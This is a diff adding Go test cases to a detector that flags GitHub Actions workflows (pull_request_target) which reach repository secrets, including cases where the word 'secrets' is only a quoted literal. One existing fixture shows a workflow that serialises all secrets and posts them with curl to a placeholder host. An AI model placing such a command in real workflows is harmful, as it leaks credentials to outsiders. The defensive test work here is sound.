@@ -180,6 +180,11 @@ func TestParseWorkflowSecretSpellings(t *testing.T) {
 		// contains neither "secrets." nor "secrets[".
 		"toJSON of the context": "on: pull_request_target\njobs:\n  a:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n    steps:\n      - run: curl -d \"$ALL\" https://x.invalid\n",
 		"bare context in expr":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo '${{ secrets }}'\n",
+		// Dropping quoted literals must not cost a real reference sitting
+		// in the same expression as one, nor the index form, whose name is
+		// quoted: `secrets['X']` reduces to `secrets[]` and still counts.
+		"reference beside a literal":  "on: pull_request_target\njobs:\n  a:\n    if: ${{ contains(github.ref, 'main') && secrets.TOKEN != '' }}\n    steps:\n      - run: true\n",
+		"index form beside a literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ contains('abc', 'b') }} ${{ secrets['DEPLOY'] }}\n",
 	}
 	for name, y := range tests {
 		t.Run(name, func(t *testing.T) {
@@ -205,6 +210,11 @@ func TestParseWorkflowSecretsWordWithoutAccess(t *testing.T) {
 		"a different context":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.event.number }}\n",
 		"similarly named var":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ env.mysecrets }}\n",
 		"across two expr ends": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.actor }} secrets ${{ github.sha }}\n",
+		// Inside an expression the word can be *data*. A workflow reacting
+		// to the word reaches no secret (Copilot, #113).
+		"single-quoted literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ 'secrets' }}\n",
+		"double-quoted literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ \"secrets\" }}\n",
+		"word matched in text":  "on: pull_request_target\njobs:\n  a:\n    if: ${{ contains(github.event.head_commit.message, 'secrets') }}\n    steps:\n      - run: true\n",
 	}
 	for name, y := range tests {
 		t.Run(name, func(t *testing.T) {
